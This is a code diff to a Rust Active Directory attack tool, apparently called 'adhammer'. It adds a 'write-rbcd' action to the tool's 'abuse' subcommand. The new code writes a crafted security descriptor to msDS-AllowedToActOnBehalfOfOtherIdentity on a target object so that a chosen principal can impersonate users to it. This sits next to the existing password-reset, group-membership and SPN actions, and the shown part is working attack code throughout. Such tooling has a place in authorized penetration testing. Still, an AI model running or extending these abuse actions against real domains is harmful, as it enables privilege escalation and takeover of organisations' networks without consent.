@@ -4,7 +4,7 @@
 use adhammer_collector::{Collector, LdapConfig};
 use adhammer_graph::ControlGraph;
 use adhammer_report::{Report, RiskConfig};
-use anyhow::Result;
+use anyhow::{Context, Result};
 use clap::{Parser, Subcommand};
 
 #[derive(Parser)]
@@ -213,7 +213,18 @@ async fn abuse(a: AbuseArgs) -> Result<()> {
             c.set_password(&target_dn, &a.value).await?;
             println!("[+] reset password of {}", a.target);
         }
-        other => anyhow::bail!("unknown action '{other}' (add-spn|add-member|set-password)"),
+        "write-rbcd" => {
+            // value = SID (S-1-...) or sAMAccountName of the principal to grant delegation.
+            let trustee = if a.value.starts_with("S-") {
+                adhammer_core::sid::Sid::parse(&a.value).context("bad SID")?
+            } else {
+                c.resolve_sid(&a.value).await?
+            };
+            let sd = adhammer_sddl::build_rbcd_sd(&trustee);
+            c.write_binary(&target_dn, "msDS-AllowedToActOnBehalfOfOtherIdentity", sd).await?;
+            println!("[+] wrote RBCD on {} allowing {} to impersonate to it", a.target, a.value);
+        }
+        other => anyhow::bail!("unknown action '{other}' (add-spn|add-member|set-password|write-rbcd)"),
     }
     Ok(())
 }
